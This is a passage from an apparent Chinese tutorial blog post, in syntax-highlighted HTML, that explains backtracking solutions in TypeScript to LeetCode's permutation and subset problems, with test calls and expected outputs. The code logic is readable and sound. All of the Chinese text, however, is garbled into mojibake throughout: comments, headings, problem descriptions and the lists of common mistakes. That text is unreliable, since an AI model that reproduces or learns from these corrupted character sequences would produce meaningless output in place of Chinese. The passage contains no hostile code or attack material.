      <span class="hljs-comment">// 2. åšé€‰æ‹©ï¼šå°†å½“å‰æ•°å­—åŠ å…¥è·¯å¾„</span>
      <span class="hljs-keyword">const</span> cur = nums[i];
      path.<span class="hljs-title function_">push</span>(cur);

      <span class="hljs-comment">// é€’å½’ï¼šç»§ç»­æ„å»ºæ’åˆ—ï¼ˆæ— éœ€ä¼ startï¼Œå› ä¸ºè¦éå†æ‰€æœ‰æœªé€‰æ•°å­—ï¼‰</span>
      <span class="hljs-title function_">backtrack</span>(path);

      <span class="hljs-comment">// 3. æ’¤é”€é€‰æ‹©ï¼šå›æº¯æ ¸å¿ƒï¼Œæ¢å¤çŠ¶æ€ï¼ˆå…ˆpopè·¯å¾„ï¼Œå†å–æ¶ˆusedæ ‡è®°ï¼‰</span>
      path.<span class="hljs-title function_">pop</span>();
      used[i] = <span class="hljs-literal">false</span>;
    }
  }

  <span class="hljs-comment">// åˆå§‹è°ƒç”¨ï¼šç©ºè·¯å¾„å¼€å§‹æ„å»ºæ’åˆ—</span>
  <span class="hljs-title function_">backtrack</span>([]);
  <span class="hljs-keyword">return</span> res;
}

<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">permute</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">permute</span>([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[0,1],[1,0]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">permute</span>([<span class="hljs-number">1</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1]]</span>
</code></pre>
<p><strong>æ˜“é”™ç‚¹ï¼š</strong></p>
<ul>
<li>å¿˜è®°ä½¿ç”¨<code>used</code>æ•°ç»„å¯¼è‡´é‡å¤é€‰åŒä¸€ä¸ªæ•°å­—</li>
<li>å¾ªç¯åº”è¯¥ä»0å¼€å§‹ï¼Œä¸æ˜¯ä»<code>start</code>å¼€å§‹ï¼ˆæ’åˆ—éœ€è¦è€ƒè™‘æ‰€æœ‰ä½ç½®ï¼‰</li>
</ul>
<hr/>
<h6 data-id="heading-22"><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fpermutations-ii%2F" target="_blank" title="https://leetcode.cn/problems/permutations-ii/" ref="nofollow noopener noreferrer">47. å…¨æ’åˆ— II</a></h6>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>ç»™å®šä¸€ä¸ªå¯åŒ…å«é‡å¤æ•°å­—çš„åºåˆ— <code>nums</code>ï¼Œ<strong>æŒ‰ä»»æ„é¡ºåº</strong>è¿”å›æ‰€æœ‰ä¸é‡å¤çš„å…¨æ’åˆ—ã€‚</p>
<p><strong>ç¤ºä¾‹ 1ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">è¾“å…¥ï¼š<span class="hljs-attr">nums</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>]
è¾“å‡ºï¼š
<span class="hljs-section">[[1,1,2]</span>,
 <span class="hljs-section">[1,2,1]</span>,
 <span class="hljs-section">[2,1,1]]</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * å…¨æ’åˆ—IIï¼šç”Ÿæˆå«é‡å¤æ•°å­—æ•°ç»„çš„æ‰€æœ‰ä¸é‡å¤æ’åˆ—
 * æ ¸å¿ƒç›®æ ‡ï¼š
 * 1. ç”Ÿæˆæ‰€æœ‰æ’åˆ—ï¼ˆè€ƒè™‘é¡ºåºï¼Œå¦‚[1,2]â‰ [2,1]ï¼‰ï¼›
 * 2. è¿‡æ»¤é‡å¤æ’åˆ—ï¼ˆå¦‚[1,1,2]ä»…ä¿ç•™å”¯ä¸€çš„3ç§æ’åˆ—ï¼‰ã€‚
 * <span class="hljs-doctag">@param</span> nums å¯èƒ½åŒ…å«é‡å¤å…ƒç´ çš„æ•°å­—æ•°ç»„
 * <span class="hljs-doctag">@returns</span> æ‰€æœ‰ä¸é‡å¤çš„æ’åˆ—æ•°ç»„
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">permuteUnique</span>(<span class="hljs-params">nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span>[][] {
  <span class="hljs-comment">// ç»“æœæ•°ç»„ï¼šå­˜å‚¨æœ€ç»ˆä¸é‡å¤çš„æ’åˆ—ï¼ˆæ·±æ‹·è´é¿å…å¼•ç”¨æ±¡æŸ“ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: <span class="hljs-built_in">number</span>[][] = [];
  <span class="hljs-comment">// æ•°ç»„é•¿åº¦ï¼šé¿å…å¾ªç¯ä¸­é‡å¤è®¡ç®—</span>
  <span class="hljs-keyword">const</span> len = nums.<span class="hljs-property">length</span>;
  <span class="hljs-comment">// usedæ•°ç»„ï¼šæ ‡è®°ç´¢å¼•içš„æ•°å­—æ˜¯å¦å·²è¢«é€‰å…¥å½“å‰è·¯å¾„ï¼Œåˆå§‹å…¨ä¸ºæœªé€‰ï¼ˆfalseï¼‰</span>
  <span class="hljs-keyword">const</span> used = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(len).<span class="hljs-title function_">fill</span>(<span class="hljs-literal">false</span>);

  <span class="hljs-comment">// ã€æ ¸å¿ƒå‰ç½®æ“ä½œã€‘æ’åºï¼šè®©é‡å¤æ•°å­—ç›¸é‚»ï¼Œä¸ºåç»­å»é‡å‰ªæåšå‡†å¤‡</span>
  <span class="hljs-comment">// ä¾‹ï¼š[1,2,1] â†’ [1,1,2]ï¼Œä¿è¯é‡å¤æ•°å­—æŒ¨åœ¨ä¸€èµ·</span>
  nums.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x - y);

  <span class="hljs-comment">/**
   * å›æº¯æ ¸å¿ƒå‡½æ•°ï¼šé€’å½’æ„å»ºæ’åˆ—è·¯å¾„
   * <span class="hljs-doctag">@param</span> path å½“å‰å·²é€‰æ•°å­—çš„è·¯å¾„ï¼ˆå¼•ç”¨ç±»å‹ï¼Œéœ€å›æº¯æ’¤é”€ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">path: <span class="hljs-built_in">number</span>[]</span>) {
    <span class="hljs-comment">// ç»ˆæ­¢æ¡ä»¶ï¼šè·¯å¾„é•¿åº¦ç­‰äºæ•°ç»„é•¿åº¦ â†’ æ‰¾åˆ°ä¸€ä¸ªå®Œæ•´æ’åˆ—</span>
    <span class="hljs-keyword">if</span> (path.<span class="hljs-property">length</span> === len) {
      <span class="hljs-comment">// æ·±æ‹·è´pathï¼šé¿å…åç»­popä¿®æ”¹å·²å­˜å…¥resçš„æ•°ç»„</span>
      res.<span class="hljs-title function_">push</span>([...path]);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-comment">// éå†æ‰€æœ‰æ•°å­—ï¼ˆæ’åˆ—éœ€éå†å…¨éƒ¨ï¼Œè€Œéä»startå¼€å§‹ï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) {
      <span class="hljs-comment">// å‰ªæ1ï¼šè·³è¿‡å·²é€‰æ•°å­—ï¼ˆé¿å…åŒä¸€æ’åˆ—ä¸­é‡å¤é€‰åŒä¸€æ•°å­—ï¼‰</span>
      <span class="hljs-keyword">if</span> (used[i]) {
        <span class="hljs-keyword">continue</span>;
      }

      <span class="hljs-comment">// ã€æ ¸å¿ƒå»é‡å‰ªæã€‘è¿‡æ»¤åŒä¸€å±‚çš„é‡å¤æ•°å­—</span>
      <span class="hljs-comment">// æ¡ä»¶1ï¼ši&gt;0 â†’ é¿å…i=0æ—¶i-1è¶Šç•Œ</span>
      <span class="hljs-comment">// æ¡ä»¶2ï¼šnums[i] === nums[i-1] â†’ å½“å‰æ•°å­—å’Œå‰ä¸€ä¸ªæ•°å­—é‡å¤</span>
      <span class="hljs-comment">// æ¡ä»¶3ï¼š!used[i-1] â†’ å‰ä¸€ä¸ªé‡å¤æ•°å­—æœªè¢«é€‰ï¼ˆè¯´æ˜æ˜¯åŒä¸€å±‚çš„é‡å¤ï¼‰ï¼Œè°å…ˆè¢«é€‰ï¼Œè°å°±å äº†è¿™ä¸ª â€œé‡å¤æ•°å­—å¼€å¤´â€ çš„å‘ï¼Œåé¢çš„é‡å¤æ•°å­—ä¸ç”¨å†é€‰ï¼ˆæ²¡è¢«é€‰èµ°â†’è·³è¿‡ï¼‰ï¼›</span>
      <span class="hljs-comment">// ä½œç”¨ï¼šä»…è·³è¿‡ã€ŒåŒä¸€å±‚ã€çš„é‡å¤æ•°å­—ï¼Œå…è®¸ã€Œä¸åŒå±‚ã€é€‰ç›¸åŒæ•°å­—</span>
      <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; nums[i] === nums[i - <span class="hljs-number">1</span>] &amp;&amp; !used[i - <span class="hljs-number">1</span>]) {
        <span class="hljs-keyword">continue</span>;
      }

      <span class="hljs-comment">// 1. æ ‡è®°å½“å‰æ•°å­—ä¸ºå·²é€‰</span>
      used[i] = <span class="hljs-literal">true</span>;
      <span class="hljs-keyword">const</span> cur = nums[i];
      <span class="hljs-comment">// 2. åšé€‰æ‹©ï¼šå°†å½“å‰æ•°å­—åŠ å…¥è·¯å¾„</span>
      path.<span class="hljs-title function_">push</span>(cur);

      <span class="hljs-comment">// é€’å½’ï¼šç»§ç»­æ„å»ºä¸‹ä¸€å±‚çš„æ’åˆ—</span>
      <span class="hljs-title function_">backtrack</span>(path);

      <span class="hljs-comment">// 3. æ’¤é”€é€‰æ‹©ï¼ˆå›æº¯æ ¸å¿ƒï¼‰ï¼šæ¢å¤è·¯å¾„å’Œusedæ ‡è®°</span>
      path.<span class="hljs-title function_">pop</span>();
      used[i] = <span class="hljs-literal">false</span>;
    }
  }

  <span class="hljs-comment">// åˆå§‹è°ƒç”¨ï¼šä»ç©ºè·¯å¾„å¼€å§‹æ„å»ºæ’åˆ—</span>
  <span class="hljs-title function_">backtrack</span>([]);
  <span class="hljs-keyword">return</span> res;
}

<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹ï¼ˆéªŒè¯å»é‡å’Œå®Œæ•´æ€§ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">permuteUnique</span>([<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1,1,2],[1,2,1],[2,1,1]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">permuteUnique</span>([<span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[1,1,2,2],[1,2,1,2],[1,2,2,1],[2,1,1,2],[2,1,2,1],[2,2,1,1]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">permuteUnique</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼šå’Œpermuteä¸€è‡´ â†’ [[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span>
</code></pre>
<p><strong>æ˜“é”™ç‚¹ï¼š</strong></p>
<ul>
<li>å»é‡é€»è¾‘é”™è¯¯ï¼šåº”è¯¥æ˜¯<code>!used[i - 1]</code>è€Œä¸æ˜¯<code>used[i - 1]</code>
<ul>
<li><code>!used[i - 1]</code>ï¼šå‰ä¸€ä¸ªç›¸åŒæ•°å­—æœªè¢«ä½¿ç”¨ï¼Œè¯´æ˜æˆ‘ä»¬åœ¨åŒä¸€å±‚å°è¯•é‡å¤æ•°å­—ï¼Œåº”è¯¥è·³è¿‡</li>
<li><code>used[i - 1]</code>ï¼šå‰ä¸€ä¸ªç›¸åŒæ•°å­—å·²è¢«ä½¿ç”¨ï¼Œè¯´æ˜æˆ‘ä»¬åœ¨ä¸åŒå±‚ï¼Œå¯ä»¥ä½¿ç”¨</li>
</ul>
</li>
</ul>
<hr/>
<h4 data-id="heading-23">3. å­é›†é—®é¢˜</h4>
<h5 data-id="heading-24">æ ¸å¿ƒç‰¹å¾</h5>
<ul>
<li>æ‰¾å‡ºæ‰€æœ‰å¯èƒ½çš„å­é›†ï¼ˆåŒ…æ‹¬ç©ºé›†ï¼‰</li>
<li>ç”¨<code>start</code>å‚æ•°æ§åˆ¶ä¸å›å¤´é€‰ï¼Œæ— éœ€ä¸¥æ ¼ç»ˆæ­¢æ¡ä»¶ï¼ˆæ¯æ¬¡é€’å½’éƒ½è®°å½•è·¯å¾„ï¼‰</li>
<li>å«é‡å¤æ•°å­—çš„å­é›†ï¼ˆå­é›†IIï¼‰éœ€å¢åŠ "å»é‡å‰ªæ"</li>
</ul>
<h5 data-id="heading-25">LeetCode é¢˜ç›®è¯¦è§£</h5>
<h6 data-id="heading-26"><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fsubsets%2F" target="_blank" title="https://leetcode.cn/problems/subsets/" ref="nofollow noopener noreferrer">78. å­é›†</a></h6>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ <code>nums</code>ï¼Œæ•°ç»„ä¸­çš„å…ƒç´ <strong>äº’ä¸ç›¸åŒ</strong>ã€‚è¿”å›è¯¥æ•°ç»„æ‰€æœ‰å¯èƒ½çš„å­é›†ï¼ˆå¹‚é›†ï¼‰ã€‚</p>
<p>è§£é›†<strong>ä¸èƒ½</strong>åŒ…å«é‡å¤çš„å­é›†ã€‚ä½ å¯ä»¥æŒ‰<strong>ä»»æ„é¡ºåº</strong>è¿”å›è§£é›†ã€‚</p>
<p><strong>ç¤ºä¾‹ 1ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">è¾“å…¥ï¼š<span class="hljs-attr">nums</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]
è¾“å‡ºï¼š<span class="hljs-section">[[]</span>,<span class="hljs-section">[1]</span>,<span class="hljs-section">[2]</span>,<span class="hljs-section">[1,2]</span>,<span class="hljs-section">[3]</span>,<span class="hljs-section">[1,3]</span>,<span class="hljs-section">[2,3]</span>,<span class="hljs-section">[1,2,3]]</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * å­é›†ï¼šç”Ÿæˆæ•°ç»„çš„æ‰€æœ‰å­é›†ï¼ˆåŒ…æ‹¬ç©ºé›†å’Œæ•°ç»„æœ¬èº«ï¼Œå­é›†ä¸è€ƒè™‘é¡ºåºï¼‰
 * æ ¸å¿ƒè§„åˆ™ï¼š
 * 1. å­é›†ä¸è€ƒè™‘é¡ºåºï¼ˆå¦‚[1,2]å’Œ[2,1]æ˜¯åŒä¸€ä¸ªå­é›†ï¼Œé€šè¿‡startIndexæ§åˆ¶ä¸å›å¤´é€‰ï¼‰ï¼›
 * 2. æ¯ä¸ªå­é›†æ˜¯åŸæ•°ç»„çš„ä»»æ„å…ƒç´ ç»„åˆï¼ˆå…ƒç´ ä¸é‡å¤é€‰å–ï¼‰ï¼›
 * 3. æ— éœ€å»é‡ï¼ˆè‹¥numsæ— é‡å¤å…ƒç´ ï¼‰ï¼Œæ— éœ€æ’åºã€‚
 * <span class="hljs-doctag">@param</span> nums æ— é‡å¤å…ƒç´ çš„æ•°å­—æ•°ç»„
 * <span class="hljs-doctag">@returns</span> æ‰€æœ‰å­é›†ç»„æˆçš„äºŒç»´æ•°ç»„
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">subsets</span>(<span class="hljs-params">nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span>[][] {
  <span class="hljs-comment">// ç»“æœæ•°ç»„ï¼šå­˜å‚¨æ‰€æœ‰å­é›†ï¼ˆæ·±æ‹·è´é¿å…å¼•ç”¨æ±¡æŸ“ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: <span class="hljs-built_in">number</span>[][] = [];
  <span class="hljs-comment">// æ•°ç»„é•¿åº¦ï¼šé¿å…å¾ªç¯ä¸­é‡å¤è®¡ç®—</span>
  <span class="hljs-keyword">const</span> len = nums.<span class="hljs-property">length</span>;

  <span class="hljs-comment">/**
   * å›æº¯æ ¸å¿ƒå‡½æ•°ï¼šé€’å½’æ„å»ºå­é›†è·¯å¾„
   * <span class="hljs-doctag">@param</span> path å½“å‰å­é›†è·¯å¾„ï¼ˆå¼•ç”¨ç±»å‹ï¼Œéœ€å›æº¯æ’¤é”€ï¼‰
   * <span class="hljs-doctag">@param</span> startIndex éå†èµ·å§‹ç´¢å¼•ï¼ˆæ§åˆ¶ä¸å›å¤´é€‰ï¼Œé¿å…ç”Ÿæˆé‡å¤å­é›†ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">path: <span class="hljs-built_in">number</span>[], startIndex: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-comment">// ã€æ ¸å¿ƒã€‘æ¯è¿›å…¥ä¸€å±‚é€’å½’ï¼Œå…ˆè®°å½•å½“å‰è·¯å¾„ï¼ˆåŒ…æ‹¬ç©ºé›†ï¼‰</span>
    <span class="hljs-comment">// åŒºåˆ«äºæ’åˆ—/ç»„åˆï¼šå­é›†é—®é¢˜æ— ç»ˆæ­¢æ¡ä»¶ï¼ˆæ‰€æœ‰è·¯å¾„éƒ½æ˜¯æœ‰æ•ˆå­é›†ï¼‰ï¼Œæ¯ä¸€æ­¥éƒ½è¦ä¿å­˜</span>
    res.<span class="hljs-title function_">push</span>([...path]);

    <span class="hljs-comment">// éå†æ•°ç»„ï¼šä»startIndexå¼€å§‹ï¼Œé¿å…å›å¤´é€‰ï¼ˆå¦‚é€‰1ååªé€‰2/3ï¼Œä¸å›å¤´é€‰1ï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = startIndex; i &lt; len; i++) {
      <span class="hljs-keyword">const</span> cur = nums[i];
      <span class="hljs-comment">// åšé€‰æ‹©ï¼šå°†å½“å‰æ•°å­—åŠ å…¥å­é›†è·¯å¾„</span>
      path.<span class="hljs-title function_">push</span>(cur);
      <span class="hljs-comment">// é€’å½’ï¼šä¸‹ä¸€å±‚ä»i+1å¼€å§‹ï¼ˆä¿è¯å…ƒç´ ä¸é‡å¤é€‰å–ï¼‰</span>
      <span class="hljs-title function_">backtrack</span>(path, i + <span class="hljs-number">1</span>);
      <span class="hljs-comment">// æ’¤é”€é€‰æ‹©ï¼šå›æº¯æ ¸å¿ƒï¼Œæ¢å¤è·¯å¾„çŠ¶æ€</span>
      path.<span class="hljs-title function_">pop</span>();
    }
  }

  <span class="hljs-comment">// åˆå§‹è°ƒç”¨ï¼šç©ºè·¯å¾„å¼€å§‹ï¼Œä»ç´¢å¼•0éå†</span>
  <span class="hljs-title function_">backtrack</span>([], <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> res;
}

<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">subsets</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[],[1],[1,2],[1,2,3],[1,3],[2],[2,3],[3]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">subsets</span>([<span class="hljs-number">0</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[],[0]]</span>
</code></pre>
<p><strong>æ˜“é”™ç‚¹ï¼š</strong></p>
<ul>
<li>å¿˜è®°åœ¨æ¯æ¬¡é€’å½’å¼€å§‹æ—¶è®°å½•è·¯å¾„ï¼ˆå­é›†é—®é¢˜éœ€è¦åœ¨æ¯ä¸ªèŠ‚ç‚¹éƒ½è®°å½•ï¼Œä¸åªæ˜¯å¶å­èŠ‚ç‚¹ï¼‰</li>
</ul>
<hr/>
<h6 data-id="heading-27"><a href="https://link.juejin.cn?target=https%3A%2F%2Fleetcode.cn%2Fproblems%2Fsubsets-ii%2F" target="_blank" title="https://leetcode.cn/problems/subsets-ii/" ref="nofollow noopener noreferrer">90. å­é›† II</a></h6>
<p><strong>é¢˜ç›®æè¿°ï¼š</strong></p>
<p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ <code>nums</code>ï¼Œå…¶ä¸­å¯èƒ½åŒ…å«é‡å¤å…ƒç´ ï¼Œè¯·ä½ è¿”å›è¯¥æ•°ç»„æ‰€æœ‰å¯èƒ½çš„å­é›†ï¼ˆå¹‚é›†ï¼‰ã€‚</p>
<p>è§£é›†<strong>ä¸èƒ½</strong>åŒ…å«é‡å¤çš„å­é›†ã€‚è¿”å›çš„è§£é›†ä¸­ï¼Œå­é›†å¯ä»¥æŒ‰<strong>ä»»æ„é¡ºåº</strong>æ’åˆ—ã€‚</p>
<p><strong>ç¤ºä¾‹ 1ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">è¾“å…¥ï¼š<span class="hljs-attr">nums</span> = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>]
è¾“å‡ºï¼š<span class="hljs-section">[[]</span>,<span class="hljs-section">[1]</span>,<span class="hljs-section">[1,2]</span>,<span class="hljs-section">[1,2,2]</span>,<span class="hljs-section">[2]</span>,<span class="hljs-section">[2,2]]</span>
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/**
 * å­é›†IIï¼šç”Ÿæˆå«é‡å¤æ•°å­—æ•°ç»„çš„æ‰€æœ‰ä¸é‡å¤å­é›†ï¼ˆåŒ…æ‹¬ç©ºé›†å’Œæ•°ç»„æœ¬èº«ï¼‰
 * æ ¸å¿ƒç›®æ ‡ï¼š
 * 1. ç”Ÿæˆæ‰€æœ‰å­é›†ï¼ˆå­é›†ä¸è€ƒè™‘é¡ºåºï¼‰ï¼›
 * 2. è¿‡æ»¤é‡å¤å­é›†ï¼ˆå¦‚nums=[1,2,2]æ—¶ï¼Œé¿å…ç”Ÿæˆä¸¤ä¸ª[1,2]ï¼‰ã€‚
 * <span class="hljs-doctag">@param</span> nums å¯èƒ½åŒ…å«é‡å¤å…ƒç´ çš„æ•°å­—æ•°ç»„
 * <span class="hljs-doctag">@returns</span> æ‰€æœ‰ä¸é‡å¤å­é›†ç»„æˆçš„äºŒç»´æ•°ç»„
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">subsetsWithDup</span>(<span class="hljs-params">nums: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span>[][] {
  <span class="hljs-comment">// ç»“æœæ•°ç»„ï¼šå­˜å‚¨æ‰€æœ‰ä¸é‡å¤å­é›†ï¼ˆæ·±æ‹·è´é¿å…å¼•ç”¨æ±¡æŸ“ï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-attr">res</span>: <span class="hljs-built_in">number</span>[][] = [];
  <span class="hljs-keyword">const</span> len = nums.<span class="hljs-property">length</span>;

  <span class="hljs-comment">// ã€æ ¸å¿ƒå‰ç½®æ“ä½œã€‘æ’åºï¼šè®©é‡å¤æ•°å­—ç›¸é‚»ï¼Œä¸ºå»é‡å‰ªæåšå‡†å¤‡</span>
  <span class="hljs-comment">// ä¾‹ï¼š[1,2,2]æ’åºåä»ä¸º[1,2,2]ï¼Œ[2,1,2]æ’åºåä¸º[1,2,2]ï¼Œä¿è¯é‡å¤æ•°å­—æŒ¨åœ¨ä¸€èµ·</span>
  nums.<span class="hljs-title function_">sort</span>(<span class="hljs-function">(<span class="hljs-params">x, y</span>) =&gt;</span> x - y);

  <span class="hljs-comment">/**
   * å›æº¯æ ¸å¿ƒå‡½æ•°ï¼šé€’å½’æ„å»ºå­é›†è·¯å¾„
   * <span class="hljs-doctag">@param</span> path å½“å‰å­é›†è·¯å¾„ï¼ˆå¼•ç”¨ç±»å‹ï¼Œéœ€å›æº¯æ’¤é”€ï¼‰
   * <span class="hljs-doctag">@param</span> startIndex éå†èµ·å§‹ç´¢å¼•ï¼ˆæ§åˆ¶ä¸å›å¤´é€‰ï¼Œé¿å…ç”Ÿæˆé‡å¤å­é›†ï¼‰
   */</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">backtrack</span>(<span class="hljs-params">path: <span class="hljs-built_in">number</span>[], startIndex: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-comment">// å­é›†é—®é¢˜æ ¸å¿ƒï¼šæ¯è¿›å…¥ä¸€å±‚é€’å½’ï¼Œå…ˆä¿å­˜å½“å‰è·¯å¾„ï¼ˆåŒ…æ‹¬ç©ºé›†ï¼‰</span>
    <span class="hljs-comment">// æ‰€æœ‰è·¯å¾„éƒ½æ˜¯æœ‰æ•ˆå­é›†ï¼Œæ— éœ€ç­‰å¾…â€œé•¿åº¦è¾¾æ ‡â€ï¼Œè¿™æ˜¯å­é›†å’Œç»„åˆ/æ’åˆ—çš„æ ¸å¿ƒåŒºåˆ«</span>
    res.<span class="hljs-title function_">push</span>([...path]);

    <span class="hljs-comment">// éå†æ•°ç»„ï¼šä»startIndexå¼€å§‹ï¼Œé¿å…å›å¤´é€‰ï¼ˆå¦‚é€‰1ååªé€‰2/2ï¼Œä¸å›å¤´é€‰1ï¼‰</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = startIndex; i &lt; len; i++) {
      <span class="hljs-comment">// ã€æ ¸å¿ƒå»é‡å‰ªæã€‘è¿‡æ»¤åŒä¸€å±‚çš„é‡å¤æ•°å­—</span>
      <span class="hljs-comment">// æ¡ä»¶1ï¼ši &gt; startIndex â†’ è·³è¿‡â€œå½“å‰å±‚ç¬¬ä¸€ä¸ªæ•°å­—â€ï¼ˆé¿å…è¯¯è¿‡æ»¤è·¨å±‚é‡å¤ï¼‰</span>
      <span class="hljs-comment">// æ¡ä»¶2ï¼šnums[i] === nums[i - 1] â†’ å½“å‰æ•°å­—å’Œå‰ä¸€ä¸ªæ•°å­—é‡å¤</span>
      <span class="hljs-comment">// ä½œç”¨ï¼šä»…è·³è¿‡åŒä¸€å±‚çš„é‡å¤æ•°å­—ï¼Œä¿ç•™ä¸åŒå±‚çš„é‡å¤æ•°å­—ï¼ˆå¦‚[2]å’Œ[1,2]éƒ½æ˜¯æœ‰æ•ˆå­é›†ï¼‰</span>
      <span class="hljs-keyword">if</span> (i &gt; startIndex &amp;&amp; nums[i] === nums[i - <span class="hljs-number">1</span>]) {
        <span class="hljs-keyword">continue</span>;
      }

      <span class="hljs-keyword">const</span> cur = nums[i];
      <span class="hljs-comment">// åšé€‰æ‹©ï¼šå°†å½“å‰æ•°å­—åŠ å…¥å­é›†è·¯å¾„</span>
      path.<span class="hljs-title function_">push</span>(cur);
      <span class="hljs-comment">// é€’å½’ï¼šä¸‹ä¸€å±‚ä»i+1å¼€å§‹ï¼ˆä¿è¯å…ƒç´ ä¸é‡å¤é€‰å–ï¼‰</span>
      <span class="hljs-title function_">backtrack</span>(path, i + <span class="hljs-number">1</span>);
      <span class="hljs-comment">// æ’¤é”€é€‰æ‹©ï¼šå›æº¯æ ¸å¿ƒï¼Œæ¢å¤è·¯å¾„çŠ¶æ€</span>
      path.<span class="hljs-title function_">pop</span>();
    }
  }

  <span class="hljs-comment">// åˆå§‹è°ƒç”¨ï¼šç©ºè·¯å¾„å¼€å§‹ï¼Œä»ç´¢å¼•0éå†</span>
  <span class="hljs-title function_">backtrack</span>([], <span class="hljs-number">0</span>);
  <span class="hljs-keyword">return</span> res;
}

<span class="hljs-comment">// æµ‹è¯•ç”¨ä¾‹ï¼ˆéªŒè¯å»é‡æ•ˆæœï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">subsetsWithDup</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[],[1],[1,2],[1,2,2],[2],[2,2]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">subsetsWithDup</span>([<span class="hljs-number">0</span>]));
<span class="hljs-comment">// æ­£ç¡®è¾“å‡ºï¼š[[],[0]]</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">subsetsWithDup</span>([<span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>]));
